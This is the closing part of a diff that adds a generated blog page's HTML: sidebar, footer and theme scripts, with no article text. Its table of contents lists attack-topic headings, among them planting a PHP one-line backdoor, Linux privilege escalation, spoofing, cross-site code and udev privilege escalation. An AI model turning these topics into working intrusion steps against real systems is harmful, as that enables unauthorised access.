+              <a href="/2019/03/26/使用Callable实现不同回调函数/" rel="prev" title="使用Callable实现不同回调函数">
+                使用Callable实现不同回调函数 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/qq.png" alt="派大星">
+            
+              <p class="site-author-name" itemprop="name">派大星</p>
+              <p class="site-description motion-element" itemprop="description"></p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives">
+              
+                  <span class="site-state-item-count">137</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                
+                  <span class="site-state-item-count">64</span>
+                  <span class="site-state-item-name">categories</span>
+                
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">230</span>
+                  <span class="site-state-item-name">tags</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/pibigstar" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="https://blog.csdn.net/junmoxi" target="_blank" title="CSDN">
+                      
+                        <i class="fa fa-fw fa-yelp"></i>CSDN</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#写个php一句话后门上去："><span class="nav-number">1.</span> <span class="nav-text">写个php一句话后门上去：</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Linux提权大致可分为"><span class="nav-number">1.1.</span> <span class="nav-text">2. Linux提权大致可分为</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#找对应的exp"><span class="nav-number">1.1.1.</span> <span class="nav-text">找对应的exp</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#3-下面开始欺骗"><span class="nav-number">2.</span> <span class="nav-text">3. 下面开始欺骗</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#4-利用跨站代码"><span class="nav-number">3.</span> <span class="nav-text">4.利用跨站代码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#5-udev提权"><span class="nav-number">4.</span> <span class="nav-text">5. udev提权</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#su的菜鸟用法"><span class="nav-number">4.1.</span> <span class="nav-text">su的菜鸟用法</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+        <div class="back-to-top">
+          <i class="fa fa-arrow-up"></i>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-[object Object]"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">派大星</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+  <script type="text/javascript" src="/js/src/js.cookie.js?v=5.1.4"></script>
+  <script type="text/javascript" src="/js/src/scroll-cookie.js?v=5.1.4"></script>
+
+
+  
+
+</body>
+</html>
+<!-- 页面点击小红心 -->
+ <script type="text/javascript" src="/js/src/clicklove.js"></script>
